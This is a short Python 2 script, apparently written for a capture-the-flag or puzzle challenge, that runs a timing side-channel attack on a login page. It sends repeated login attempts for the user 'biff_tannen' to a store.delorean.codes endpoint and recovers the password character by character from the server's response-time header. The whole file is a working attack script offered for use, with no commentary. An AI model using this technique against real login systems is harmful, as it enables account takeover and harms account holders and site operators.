import requests

best_time = 0.01
password = list("aaaaaa")
current_increment_index = 0


def increment_password():
    cur_char = password[current_increment_index]
    if cur_char == 'z':
        password[current_increment_index] = '0'
    elif cur_char == '9':
        password[current_increment_index] = 'A'
    elif cur_char == 'Z':
        raise Exception("Got to Z!")
    else:
        password[current_increment_index] = chr(ord(cur_char) + 1)
        

def str_pass():
    return "".join(password)


print "Starting attack"
r = requests.post("https://store.delorean.codes/u/csun/login", data={'username': 'biff_tannen', 'password': str_pass()})
while 'Bad Password' in r.text:
    time = float(r.headers['x-upstream-response-time'])

    if time > best_time:
        print "new pass " + str_pass()
        print "new time" + str(time)
        best_time = time
        current_increment_index += 1
        if current_increment_index >= len(password):
            password.append("a")
    else:
        increment_password()

    r = requests.post("https://store.delorean.codes/u/csun/login", data={'username': 'biff_tannen', 'password': str_pass()})

print "DONE " + str_pass()
